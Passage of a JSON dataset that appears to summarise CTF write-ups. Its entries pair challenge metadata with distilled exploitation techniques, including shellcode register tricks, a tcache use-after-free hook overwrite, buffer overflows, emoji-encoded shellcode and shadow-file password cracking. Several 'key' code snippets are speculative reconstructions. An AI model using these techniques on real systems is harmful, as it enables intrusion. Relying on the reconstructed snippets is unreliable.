        "max_score": 384,
        "difficulty": 0.578125,
        "knowledge": [
            "In a challenge focusing on exploiting a service executing user-supplied shellcode with memory and execution constraints, utilizing processor registers not reset by the execution environment (such as upper 16 bytes of the YMM registers not covered by `user_fpregs_struct`) enables the storage and retrieval of key values across instruction reversals. This approach is particularly useful when the environment resets register states but misses broader architectural features.\n   Example payload snippet for initial forward execution: \n   ```asm\n   mov rax, 0x02170000       ; Direct address manipulation\n   mov [rax], rdi            ; Manipulate memory directly with preserved registers\n   vmovups ymm0, [rax]       ; Utilize YMM registers for data storage beyond reset\n   ```",
            "In a challenge requiring the optimization of an algorithm to decode a flag, where the algorithm's performance drastically reduces with linear scalability issues, converting the algorithm to a mathematically optimized version using properties of linear recurrences and modular arithmetic greatly enhances performance. This is especially applicable for algorithms based on sequences or iterations with predictable patterns that can be mathematically transformed.\n   Example approach breakdown: Convert an iterative algorithm based on a sequence generation into a direct calculation exploiting the mathematical properties of the sequence, reducing time complexity from potentially exponential to linear or constant time."
        ],
        "key": "```c\n while ( 1 ) {  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))   // Step a single instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&stat_loc);               // Wait for the instruction  \n   if (!(stat_loc & 0x7F))  \n     break;  \n  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)                       // Stop if the shellcode died  \n     errorMessage(\"Child dead unexpectedly.\");  \n  \n   if (stepCounter > 0xFFF)                    // Only do 0xFFF steps  \n     errorMessage(\"Too many steps.\");  \n  \n   if (shellcodeReached != 1 && getRIP() == 0xDEAD0080) { // Start of\nshellcode  \n  \n     shellcodeReached = 1;  \n     nop();  \n     resetState();                             // Reset all registers  \n     nullMemory();                             // Zero the 0x2170000 memory page  \n     writeCookie();                            // Write a random 8 byte cookie to 0x2170000  \n  \n   }  \n   if (shellcodeReached) {                     // In the actual shellcode\ndon't execute  \n                                               // syscalls  \n     if (waitForExitSyscall())   {             // Skip all syscalls  \n                                               // Exit on a exit syscall  \n       doesExit = 1;                           // Stop the execution  \n       break;  \n  \n     }  \n     currentStep = stepCounter++;  \n     RIPArray[currentStep] = getCurrentRIP();  // Save the instruction pointer  \n                                               // of each executed instruction  \n   }  \n  \n }  \n```\n\n```c\nvoid timemachine() {\n\n int wstatus;  \n int curStep;  \n pid_t waitForPID;  \n int isChildDead;  \n user_regs_struct regs;\n\n resetState(); // Reset registers  \n  \n for ( curStep = stepCounter - 1; curStep >= 0; curStep-- ) { // Iterate\nbackwards to travel back in time  \n  \n   if (ptrace(PTRACE_GETREGS, pid, 0, &regs)) // Read the current register\nstate  \n     err(1, \"ptrace\");  \n  \n   regs.rip = RIPArray[curStep];  // Set instruction pointer to saved one  \n  \n   if (ptrace(PTRACE_SETREGS, pid, 0, &regs)) // Write the changed register  \n     err(1, \"ptrace\");  \n  \n   if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) // Step a instruction  \n     err(1, \"ptrace\");  \n  \n   waitForPID = wait(&wstatus); // Wait for it to be executed  \n  \n   // Handle unexpected death of the shellcode  \n   if (!(stat_loc & 0x7F)) {  \n     puts(\"exit too early..\");  \n     exit(1);  \n   }  \n   isChildDead = (stat_loc >> 8) & 0xFF;  \n   if (isChildDead != 5)  \n     errorMessage(\"Child dead..\");  \n  \n }  \n  \n}  \n```\n\n```c\nvoid resetState() {\n\n user_regs_struct userRegs;  \n user_fpregs_struct userFloatRegs;\n\n memset(&userRegs, 0, sizeof(userRegs)); // zero the register state  \n userRegs.rip = 0xDEAD0080;              // set the instruction pointer to\n0xDEAD0080  \n userRegs.cs = 0x33;                     // sets the code segment to 0x33 ->\n64bit code segment  \nuserRegs.ss = 0x2B;                     // sets the stack segment to 0x2B ->\n64bit data segment  \n  \n if (ptrace(PTRACE_SETREGS, pid, 0, &userRegs)) // reset the user registers  \n   err(1, \"ptrace\");  \n  \n memset(&userFloatRegs, 0, sizeof(userFloatRegs)); // zero the floating point\nregister state  \n  \n if (ptrace(PTRACE_SETFPREGS, pid, 0, &userFloatRegs)) // reset the floating\npoint registers  \n   err(1, \"ptrace\");  \n  \n}  \n```\n\n```c\nstruct user_fpregs_struct  \n{  \n __uint16_t                cwd;  \n __uint16_t                swd;  \n __uint16_t                ftw;  \n __uint16_t                fop;  \n __uint64_t                rip;  \n __uint64_t                rdp;  \n __uint32_t                mxcsr;  \n __uint32_t                mxcr_mask;  \n __uint32_t                st_space[32];   /* 8*16 bytes for each FP-reg = 128\nbytes */  \n __uint32_t                xmm_space[64];  /* 16*16 bytes for each XMM-reg =\n256 bytes */  \n __uint32_t                padding[24];  \n};  \n```"
    },
    {
        "name": "tex_based_adventure",
        "write_up": "dataset/raw/tex_based_adventure.md",
        "type": "reverse",
        "competition": [
            "HXP/2022",
            "https://ctftime.org/event/1845/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with code obfuscation that employs character code manipulation, a practical approach to deobfuscation is to analyze the pattern used to alter the characters and then create a script that reverses these changes. For challenges that involve character generation through operations like `chr(32 + (71 + x)%96)`, constructing a reverse operation script that decodes the obfuscated text can be crucial to understanding the underlying logic. This method is especially useful in scenarios where encoded blocks of text are critical for advancing in the challenge.",
            "In challenges involving game logic and state manipulation, particularly those that simulate environments like mazes or puzzles with specific winning conditions, implementing a Breadth-First Search (BFS) algorithm can be highly effective for finding the shortest path to a goal or for simulating game rounds efficiently. This technique is invaluable when the objective includes navigating through complex structures or when needing to compute the minimal sequence of actions to achieve a desired outcome. For example, writing scripts to automate game actions based on current states and possible moves can significantly streamline the process of solving these puzzles.\n\nExample pseudocode for BFS implementation in a maze-like challenge:\n\n```python\nfrom collections import deque\n\ndef bfs(graph, start, goal):\n    visited = set()\n    queue = deque([(start, [])])\n\n    while queue:\n        current, path = queue.popleft()\n        if current == goal:\n            return path\n\n        visited.add(current)\n        for neighbor in graph[current]:\n            if neighbor not in visited:\n                next_path = path + [neighbor]\n                queue.append((neighbor, next_path))\n\n    return None\n\n# Example usage\ngraph = {...}  # Define the graph structure with rooms as nodes and possible moves as edges\nstart = 'StartRoom'\ngoal = 'GoalRoom'\npath = bfs(graph, start, goal)\nprint(f\"Path to victory: {' -> '.join(path)}\")\n```\n\nThis BFS pseudocode can be adapted to the specific requirements of a CTF challenge, such as adding conditions for picking up keys or avoiding enemies, to find the optimal solution path."
        ],
        "key": "```tex\n\\char_generate:nn  \n{  \n   \\int_eval:n  \n   {  \n       32+\\int_mod:nn  \n       {  \n           71+`#1  \n       }  \n       {96}  \n   }  \n}  \n{12}  \n```"
    },
    {
        "name": "The CDR of the CAR",
        "write_up": "dataset/raw/The CDR of the CAR... RAH, RAH, RAH!!!.md",
        "type": "This write-up describes a reverse challenge, as it involves analyzing and understanding a provided code snippet in order to determine the desired output.",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving recursive calls and list manipulations, understanding the order and depth of recursion is crucial. The pattern of accessing elements involves alternating between the first element (`car`) and the rest of the list (`cdr`) in a nested manner. This principle can be applied to extract specific elements or sublists from a complex nested list structure.",
            "For challenges that require restructuring lists to match a specific output through recursion, creating a carefully nested structure based on the required recursion pattern is essential. This involves grouping elements into sublists in a way that aligns with the recursive access pattern described in the challenge. Python functions `car(a)` to get the first element of a list `a` and `cdr(a)` to get the rest of the list `a` excluding the first element can be directly applied to navigate and manipulate nested lists.\n\nExample Validation Code:\n\n```python\ndef car(a): return a[0]\ndef cdr(a): return a[1:]\n\n# The list is structured to match the given recursive pattern.\nb = (('ascent','xray',(('yarbrough','jackal',((('minstrel','nevermore','outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus','quill','renegade','llama','ghost','hellscape','industrious','zombification')),'bestial'),'cadre'),'dark'),'efficacious'),'foundational')\n\n# Applying the recursive pattern to extract the desired sublist.\nprint(cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(b)))))))))))))\n```"
        ],
        "key": "```python\ndef car(a): return a[0]\n\ndef cdr(a): return a[1:]\n\nb = (('ascent','xray',(('yarbrough','jackal',((('minstrel','nevermore','outcast','kitten'),\n('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus','quill','renegade',\n'llama','ghost','hellscape','industrious','zombification')),'bestial'),'cadre'),'dark'),\n'efficacious'),'foundational')\n\nprint(cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(b)))))))))))))\n```"
    },
    {
        "name": "The Cobol Job",
        "write_up": "dataset/raw/The Cobol Job.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2021",
            "https://ctftime.org/event/1199/tasks/"
        ],
        "score": 130,
        "max_score": 450,
        "difficulty": 0.28888888888888886,
        "knowledge": [
            "To leak segment mappings in environments where direct file access is restricted and might trigger permissions issues (like `O_RDWR` errors), use the technique of copying the desired file (e.g., `/proc/self/maps`) to a permissible stdout location such as `/dev/stdout`. This method bypasses the permissions check and allows for information disclosure of memory layout or libc addresses without direct file reading capabilities. Example usage:\n```python\ndo_copy(\"/proc/self/maps\", \"/dev/stdout\")\n```",
            "In scenarios where a use-after-free vulnerability exists within a file handling or similar function (demonstrated in the `CBL_COPY_FILE()` function within `libcob`), manipulate the tcache bins to overwrite `__free_hook` with a one_gadget address. This method involves creating conditions that trigger a use-after-free, followed by carefully crafted allocations and deallocations to control tcache bins. The process includes steps such as:\n    - Triggering a use-after-free vulnerability to get a pointer into a tcache bin.\n    - Controlling the size of the tcache bin via operations like creating a file with a specific length.\n    - Writing to a freed memory location to redirect its forward and back pointers to `__free_hook`.\n    - Performing further allocations to manipulate tcache such that future allocations return a pointer to `__free_hook`.\n    - Writing a one_gadget address to the location pointed by `__free_hook` and triggering a freeing action to execute arbitrary code. Example conceptual approach (not direct code due to complexity and case specificity):\n```c\n// Conceptual steps in C-like pseudo-code\ncreate_file(\"controlled_size_filename\");\nwrite_file(\"address_of___free_hook\");\ntrigger_use_after_free();\nallocate(\"size_that_targets_correct_tcache_bin\");\nwrite_one_gadget_to_free_hook();\ntrigger_free_to_execute_one_gadget();\n```"
        ],
        "key": "```c\nfn1 = cob_str_from_fld (cob_current_module->cob_procedure_parameters[0]);  \n...  \nfree (fn1);  \n...  \nwhile ((i = read (fd1, fn1, sizeof(fn1))) > 0) {  \n...  \n}  \n```"
    },
    {
        "name": "The Dark Knight",
        "write_up": "dataset/raw/The Dark Knight.md",
        "type": "The type of challenge for this write-up is **forensics**.",
        "competition": [
            "Hero/2021",
            "https://ctftime.org/event/1284/tasks/"
        ],
        "score": 50,
        "max_score": 350,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "When access to `/etc/shadow` is restricted, reviewing `/etc/passwd` can still provide valuable user and group information. Identifying anomalies such as a user belonging to an unexpected group could indicate a special privilege or access path. This observation may lead to discovering methods to escalate privileges or access restricted files.",
            "For password cracking, when you obtain a hashed password from `/etc/shadow`, employing a tool like John the Ripper with a common password wordlist (e.g., rockyou.txt) can effectively crack the hash. This technique requires obtaining the hashed password and preparing it in a format recognizable by John the Ripper. This approach is effective for hashed passwords that are not overly complex and are included within the wordlist being used.\n   - Sample command: `john -wordlist=./rockyou.txt unshadowed.txt`"
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\n\nimport os\n\ndef check_user_group(user):\n    try:\n        groups = os.popen(f\"groups {user}\").read()\n        if \"shadow\" in groups:\n            return True\n        return False\n    except Exception as e:\n        print(f\"Error checking user group: {e}\")\n        return False\n\ndef read_shadow_file():\n    try:\n        with open('/etc/shadow', 'r') as file:\n            data = file.read()\n            return data\n    except PermissionError:\n        print(\"Access denied to /etc/shadow\")\n        return None\n\nuser = \"bradley_warner\"\nif check_user_group(user):\n    shadow_data = read_shadow_file()\n    if shadow_data:\n        print(shadow_data)\n```"
    },
    {
        "name": "The Early School",
        "write_up": "dataset/raw/The Early School.md",
        "type": "crypto",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 32,
        "max_score": 500,
        "difficulty": 0.064,
        "knowledge": [
            "When an encryption algorithm encrypts data by splitting the input into chunks and applying mathematical operations bit by bit, a feasible approach to decrypting without understanding the precise math is to brute force each chunk's possible outcomes. This is particularly applicable when the size of the chunks makes the number of possible outcomes manageable, such as when operating on binary data 2 bits at a time. The distinct output strings for each input chunk combination can be reverse-mapped through a case selection strategy in the decryption process, assuming the output space for each input is finite and known.\n   \n   Example approach: For an encryption function that processes input in 2-bit chunks, create a decryption map such as `{\"00\": \"000\", \"01\": \"001\", \"10\": \"010\", \"11\": \"011\"}` where the keys are the encrypted 3-bit outputs and the values are the original 2-bit inputs. Then, iterate over the encrypted data in 3-bit chunks, replacing each chunk with its corresponding 2-bit original chunk using the map.",
            "When a CTF challenge provides an encryption script used in the encryption process, thoroughly analyze the script to understand the encryption mechanism. This can include the chunk size of the data being processed, the mathematical operations applied, or any patterns in how data is manipulated. Insight gained from the script can guide the development of a decryption strategy, even if the exact mathematical reversal is not straightforward. Developing familiarity with how encryption scripts operate can also accelerate the problem-solving process in future challenges.\n\n   Example approach: If the encryption script reads binary data in 2-bit chunks and outputs 3-bit chunks after applying certain operations, focus on understanding these operations and their implications for possible outputs. This understanding can then be used to brute force the decryption by testing all possible mappings from the 3-bit encrypted output back to the original 2-bit inputs."
        ],
        "key": "```python\ndef encrypt(data):\n    encrypted = \"\"\n    for i in range(0, len(data), 2):\n        chunk = data[i:i+2]\n        if chunk == \"00\":\n            encrypted += \"010\"\n        elif chunk == \"01\":\n            encrypted += \"110\"\n        elif chunk == \"10\":\n            encrypted += \"011\"\n        elif chunk == \"11\":\n            encrypted += \"111\"\n    return encrypted\n```"
    },
    {
        "name": "The Emojificator",
        "write_up": "dataset/raw/The Emojificator.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 498,
        "max_score": 2199,
        "difficulty": 0.22646657571623466,
        "knowledge": [
            "When faced with an unconventional input method in a CTF challenge, specifically one using emojis as bytes, a comprehensive mapping between the desired byte values and available emojis can be established. This mapping should encode the full range of byte values (0-255) using a combination of emojis and operations (addition and subtraction) to represent each byte uniquely. Example implementation involves using a base set of emojis representing certain byte values and then systematically creating new representations for missing byte values by adding or subtracting known emojis.",
            "In scenarios requiring the execution of shellcode where direct binary input is not possible, before sending the actual payload, a verification step using part of the payload can ensure that the conversion from the emoji representation back to byte values on the server-side matches the intended values. This step is critical to confirm payload integrity and functionality before full execution. Utilize functions to encode shellcode into emojis according to the emoji-byte mapping, check conversions with a test request if necessary, then send the complete emoji shellcode to trigger the intended behavior, such as reading a file."
        ],
        "key": "```python\ndef send_emojis_to_server(code_to_run):  \n\theaders = {  \n\t    'Accept': '*/*',  \n\t    'Accept-Language': 'en-DE,en;q=0.9,de-DE;q=0.8,de;q=0.7,en-US;q=0.6',  \n\t    'Cache-Control': 'no-cache',  \n\t    'Connection': 'keep-alive',  \n\t    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryZbD8o2xSaiWZUtEf',  \n\t    'DNT': '1',  \n\t    'Origin': 'http://challenge.nahamcon.com:31203',  \n\t    'Pragma': 'no-cache',  \n\t    'Referer': 'http://challenge.nahamcon.com:31203/',  \n\t    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',  \n\t    'X-Requested-With': 'XMLHttpRequest',  \n\t}\n\n\tdata = '------WebKitFormBoundaryZbD8o2xSaiWZUtEf\\r\\nContent-Disposition: form-data; name=\"shellcode\"\\r\\n\\r\\n' + code_to_run + '\\r\\n------WebKitFormBoundaryZbD8o2xSaiWZUtEf--\\r\\n'\n\n\tr = requests.post(base_url + '/run', headers=headers, data=data.encode(\"utf8\"), verify=False)  \n\tprint(\"[DEBUG]\", r.text)  \n\treturn r.text.split(\"'\")[1]\n```"
    },
    {
        "name": "The Jungle",
        "write_up": "dataset/raw/The Jungle.md",
        "type": "web",
        "competition": [
            "watevrCTF/2019",
            "https://ctftime.org/event/893/tasks/"
        ],
        "score": 356,
        "max_score": 500,
        "difficulty": 0.712,
        "knowledge": [
            "When encountering a web application with an unusually large number of redirects that lead to an error (e.g., \"too many redirects\" error), consider writing a script that systematically visits all possible paths or steps sequentially instead of relying on the browser's handling of redirects. This approach allows for a more controlled investigation of the web application's behavior and can help bypass limitations set by browsers, such as Chrome's redirect limit.",
            "For challenges hinting at a timing difference in the web server's response, utilize timing attacks to uncover hidden paths or actions. Specifically, if different paths or actions cause the server to respond in noticeably different times, these differences can be exploited to discover the correct sequence of actions needed to achieve the goal. For instance, by measuring the response time for each request and comparing it against a baseline, one can identify the correct sequence of steps in a web application that relies on side-channel information (timing differences) for navigation. This requires careful measurement of response times for each action and may involve resetting session data (cookies) to ensure each test starts from the same state."
        ],
        "key": "```python\nfrom flask import Flask, request, redirect, make_response\nimport time\nimport random\n\napp = Flask(__name__)\n\n# Simulated path to the flag\nflag_path = random.sample(range(1, 51), 50)\n\n@app.route('/path/<int:step>')\ndef path(step):\n    # Retrieve the current path from the cookie\n    current_path = request.cookies.get('path', '')\n    current_path_list = list(map(int, current_path.split(','))) if current_path else []\n\n    # Check if the step is correct\n    if len(current_path_list) < 50 and step == flag_path[len(current_path_list)]:\n        current_path_list.append(step)\n        time.sleep(0.5)  # Simulate the delay for a correct step\n    else:\n        return redirect('/lost')\n\n    # If the path is complete, redirect to the flag\n    if len(current_path_list) == 50:\n        return redirect('/flag')\n\n    # Update the cookie with the new path\n    resp = make_response(redirect(f'/path/{step + 1}'))\n    resp.set_cookie('path', ','.join(map(str, current_path_list)))\n    return resp\n\n@app.route('/lost')\ndef lost():\n    return \"You are lost. Try again.\"\n\n@app.route('/flag')\ndef flag():\n    return \"Congratulations! Here is your flag: FLAG{example_flag}\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
    },
    {
        "name": "The Legend of the Chozo",
        "write_up": "dataset/raw/The Legend of the Chozo.md",
        "type": "forensics",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 100,
        "max_score": 991,
        "difficulty": 0.10090817356205853,
        "knowledge": [
            "When faced with a corrupted file that doesn't have a recognizable format, examine the header with tools like `hd` or `xxd` to identify familiar patterns. For instance, a corrupted image might still contain identifiable patterns corresponding to known file types such as PNGs. Correctly identifying and reconstructing file headers can help recover corrupted files. This approach can be especially beneficial in CTF challenges involving file format corruption or forensic analysis.  \n   Example technique: If a PNG header is corrupted, one could use `printf` and `dd` to correctly write the PNG signature (`\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A`) at the beginning of the file.",
            "Use specific diagnostic tools related to the file format for integrity checks and potential error detection. For PNG files, the `pngcheck` tool is useful for verifying the integrity, checking internal checksums, and decompressing image data to identify any errors within a PNG file. This method is critical in scenarios where file integrity is crucial, such as digital forensics or when troubleshooting corrupted image data in CTF challenges.\n   Example command: `pngcheck -v image.png` to thoroughly verify a PNG file's integrity and ensure no errors are detected before proceeding with the extraction of information or flags hidden within."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char buffer[8];\n    FILE *file = fopen(\"CorruptedData.chr\", \"rb\");\n    if (file == NULL) {\n        printf(\"Error opening file\\n\");\n        return 1;\n    }\n\n    fread(buffer, 1, 8, file);\n    fclose(file);\n\n    if (memcmp(buffer, \"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\", 8) != 0) {\n        printf(\"Corrupted PNG header detected\\n\");\n        // Vulnerability: Incorrect handling of corrupted header\n        // Potential fix: Correct the header\n        memcpy(buffer, \"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\", 8);\n        file = fopen(\"image.png\", \"r+b\");\n        if (file == NULL) {\n            printf(\"Error opening file for writing\\n\");\n            return 1;\n        }\n        fwrite(buffer, 1, 8, file);\n        fclose(file);\n    } else {\n        printf(\"PNG header is correct\\n\");\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "The List",
        "write_up": "dataset/raw/The List.md",
        "type": "The type of challenge in this write-up is ***pwn*** (Binary Exploitation, Buffer Overflow).",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": 452,
        "max_score": 500,
        "difficulty": 0.904,
        "knowledge": [
            "In binary exploitation challenges featuring buffer overflow vulnerabilities, filling up a buffer without hitting a condition that stops you from adding more data - such as a null byte check - can pave the way to overflow. Specifically, if an application checks for a null byte at the beginning of a buffer to decide if more data can be added, you can exploit this by ensuring your payload doesn't start with a null byte and then using a different part of the application that allows for larger input to overflow the buffer. This strategy can be especially effective if there are two different functions for adding or editing data that allow for different sizes of input.",
            "In scenarios where specific functions like `strcspn` are used to manipulate strings \u2013 for instance, replacing newline characters (`\\n`) with null bytes \u2013 and there is an inconsistency in input size limits between different functions (such as adding a user vs. changing a user's name allowing 32 bytes vs. 80 bytes), the larger input function can be exploited to overflow the buffer. This requires carefully planning the initial payload to avoid premature null bytes introduced by input handling functions and then crafting an overflow payload that exploits the input size discrepancy to overwrite memory addresses, potentially allowing arbitrary code execution or, in CTF challenges, redirecting execution to a function that reveals the flag.\n\nExample payload concept (not specific code due to payload specifics depending on the binary's memory layout):",
            "Add users up to the point where the next user would overwrite a critical pointer.",
            "Use an initial payload that fills up the space exactly, avoiding an early null byte but ending with a payload that `strcspn` modifies to introduce a null byte exactly where needed.",
            "Use the function allowing more input to craft a payload that overflows the buffer and overwrites the return address or a function pointer with the address of the `give_flag` function or equivalent."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid give_flag() {\n    // Function to give the flag\n}\n\nvoid add_user(char *buffer) {\n    char user[32];\n    if (buffer[0] == '\\0') {\n        fgets(user, 32, stdin);\n        user[strcspn(user, \"\\n\")] = '\\0';\n        strcpy(buffer, user);\n    }\n}\n\nvoid change_uname(char *buffer) {\n    char new_user[80]; // Vulnerable buffer\n    fgets(new_user, 80, stdin); // Allows overflow\n    new_user[strcspn(new_user, \"\\n\")] = '\\0';\n    strcpy(buffer, new_user);\n}\n\nint main() {\n    char buffer[512] = {0}; // 0x200 space\n    printf(\"Enter your name: \");\n    fgets(buffer, 32, stdin);\n    buffer[strcspn(buffer, \"\\n\")] = '\\0';\n\n    // Menu and other functions\n    // ...\n\n    return 0;\n}\n```"
    },
    {
        "name": "THE LYCH KING",
        "write_up": "dataset/raw/THE LYCH KING.md",
        "type": "reverse",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When dealing with binary files compiled from high-level languages like Haskell, using language-specific decompilers can greatly enhance reverse-engineering efforts. This is especially useful for analyzing binaries compiled by GHC (Glasgow Haskell Compiler), where tools like hsdecomp help in decompiling to get an initial understanding of the binary's functionality.",
            "In cryptographic challenges where an XOR operation is used, and the algorithm involves generating a keystream based on certain inputs (like reversing digits and adding), reimplementing the encryption or decryption logic in a familiar programming language can be an effective strategy. This allows for easy manipulation of variables, such as changing seeds or adjusting algorithms, to decrypt the ciphertext or encrypt plaintext as needed. A practical approach involves writing a script to automate the encryption/decryption process with varying parameters until the correct output is identified.\n   \n   Example manipulation code snippet:\n   ```python\n   def xor_b_str(byte_array, key_string):\n       xored = []  \n       for i in range(min(len(byte_array), len(key_string))):  \n           xored_value = byte_array[i % len(byte_array)] ^ ord(key_string[i % len(key_string)])  \n           xored.append(chr(xored_value))  \n       return ''.join(xored)\n\n   def getPad(seed):  \n       result = \"\"  \n       while not isPalindrome(seed) and len(result) < 1000:  \n           result += str(seed)  \n           seed += reverseDigits(seed)  \n       return result\n\n   # Example of XORing the data with the pad generated from a seed\n   pad = getPad(seed)\n   decrypted_output = xor_b_str(cipher_text_bytes, pad)\n   ```\n   The approach leverages Python for string manipulation, bitwise operations, and handling of byte arrays, showcasing a method to solve cryptographic problems efficiently in CTF challenges."
        ],
        "key": "```haskell\nMain_main_closure = >>= $fMonadIO  \n   getArgs  \n   (\\ARGS ->  \n       $  \n           putStrLn  \n           ((\\ARG0 ->  \n               case (ARG0 == \"\") of  \n                   __default -> zipWith (on (. (fmap $fFunctor-> chr) (xor $fBitsInt)) ord)  \n                       HEAD  \n                       ((\\HEAD0 YY ->  \n                           case (XX == \"\") of  \n                               __default -> take (length HEAD0) (intercalate [] (map show (Function_V YY (length HEAD0) 0)))  \n                       )  \n                           HEAD  \n                           1997  \n                       )  \n           )  \n               (head ARGS)  \n           )  \n   )\n\nFunction_V X Y Z =  \n   case (X == (Function_R X)) of  \n       __default -> case (Z >= (toInteger Y)) of  \n           __default -> : X (Function_V ((X + (Function_R X))) Y (Z + (Function_mag X)))\n\nFunction_mag A0 =  \n   case (A0 == 0) of  \n       __default -> case (A0 > 0) of  \n           __default -> case (A0 < 0) of  \n               __default -> patError \"lich_cipher.hs:(20,1)-(23,15)|function mag\"\n\nFunction_R X =  \n   case (X == 0) of  \n       __default -> ( (X mod 10) * (10 ^ ((Function_mag X) - 1))) + (Function_R (X div 10))  \n```"
    },
    {
        "name": "The Most Worthy Distinction of Pain",
        "write_up": "dataset/raw/The Most Worthy Distinction of Pain.md",
        "type": "misc",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": 465,
        "max_score": 500,
        "difficulty": 0.93,
        "knowledge": [
            "When facing an encryption challenge where each word in the ciphertext corresponds to a pair of letters in the plaintext, utilize a known plaintext attack (KPA) strategy by generating all possible two-letter combinations, encrypting them, and mapping the output to the pairs. This approach allows for the construction of a decryption key by identifying the correspondence between encrypted words and plaintext pairs.",
            "To efficiently decrypt ciphertext once a key is constructed, store the key-value pairs in a dictionary where each key is an encrypted word and its value is the corresponding plaintext letters. Iterating through the ciphertext and looking up each word in the dictionary provides a quick decryption process. This method significantly reduces computational effort compared to brute force decryption, especially when the encryption mechanism is deterministic and each plaintext pair always results in the same encrypted word irrespective of its position in the plaintext.\n\nExample Python dictionary setup for storing the decryption key:\n```python\nkey = {\n    'encryptedWord1': 'ab',\n    'encryptedWord2': 'cd',\n    # Add more key-value pairs based on encryption output\n}\n```\n\nExample usage for decryption:\n```python\ndecryptedText = ''.join(key[word] for word in encryptedText.split())\n```"
        ],
        "key": "```go\nfunc encode_one(c uint8, codex_file *os.File) string {\n    // Vulnerable code: This function reads from the codex file without bounds checking\n    // and uses the character value directly to index into the file, which can lead to\n    // out-of-bounds reads or incorrect word selection if the character value is not\n    // properly constrained.\n    codex_file.Seek(int64(c)*8, 0)\n    word := make([]byte, 8)\n    codex_file.Read(word)\n    return string(word)\n}\n```"
    },
    {
        "name": "The note",
        "write_up": "dataset/raw/The note.md",
        "type": "misc",
        "competition": [
            "SecurityFest/2018",
            "https://ctftime.org/event/622/tasks/"
        ],
        "score": 485,
        "max_score": 499,
        "difficulty": 0.9719438877755511,
        "knowledge": [
            "In challenges involving historical or thematic ciphers, contextual clues or themes from the challenge description can be critical in identifying the cipher used. If a challenge mentions or hints at historical, literary, or thematic elements (e.g., mentioning a book with nihilism as a central theme), it can be invaluable to explore ciphers or cryptographic methods associated with those themes or periods. For instance, a challenge hinting at nihilism led to the discovery that a Nihilist cipher was used, a classical encryption method.",
            "When dealing with ciphertext encoded via a polybius square and an added layer of security, such as an additive key, breaking down the cipher involves several systematic steps before deciphering the plaintext:\n   - Analyze the frequency of each number in the ciphertext to identify potential patterns or anomalies.\n   - Recognize and eliminate the additive key using possible key lengths and validating against the polybius square coordinates to ensure all resultant numbers are within valid bounds (`1 \u2264 row \u2264 5`, `1 \u2264 column \u2264 5`).\n   - Utilize frequency analysis and known cribs (e.g., common trigrams like \"THE\" in English) to reconstruct the polybius square and sequentially decode the plaintext. This approach leans on the fact that certain letters or combinations thereof appear with more regularity in a given language.\n   \nExample process for subtracting a potential key from a column in the ciphertext (simplified for clarity):\nFor a column `i` and a potential key value `k[i]`:\n```\nCiphered values (column): 42 37 45 \nPotential key (k[i]): 12\nSubtracted values: 30 25 33\n```\nIf the subtracted values correspond to valid polybius square coordinates, `k[i]` may be a correct part of the additive key."
        ],
        "key": "```python\ndef encrypt(plaintext, key, polybius_square):\n    ciphertext = []\n    key_length = len(key)\n    for i, char in enumerate(plaintext):\n        if char in polybius_square:\n            row, col = polybius_square[char]\n            key_row, key_col = polybius_square[key[i % key_length]]\n            cipher_num = (row * 10 + col) + (key_row * 10 + key_col)\n            ciphertext.append(cipher_num)\n    return ciphertext\n\ndef decrypt(ciphertext, key, polybius_square):\n    reverse_square = {v: k for k, v in polybius_square.items()}\n    plaintext = []\n    key_length = len(key)\n    for i, num in enumerate(ciphertext):\n        key_row, key_col = polybius_square[key[i % key_length]]\n        cipher_num = num - (key_row * 10 + key_col)\n        if cipher_num in reverse_square:\n            plaintext.append(reverse_square[cipher_num])\n    return ''.join(plaintext)\n\npolybius_square = {\n    'A': (1, 1), 'B': (1, 2), 'C': (1, 3), 'D': (1, 4), 'E': (1, 5),\n    'F': (2, 1), 'G': (2, 2), 'H': (2, 3), 'I': (2, 4), 'K': (2, 5),\n    'L': (3, 1), 'M': (3, 2), 'N': (3, 3), 'O': (3, 4), 'P': (3, 5),\n    'Q': (4, 1), 'R': (4, 2), 'S': (4, 3), 'T': (4, 4), 'U': (4, 5),\n    'V': (5, 1), 'W': (5, 2), 'X': (5, 3), 'Y': (5, 4), 'Z': (5, 5)\n}\n\nplaintext = \"HELLO\"\nkey = \"KEY\"\nciphertext = 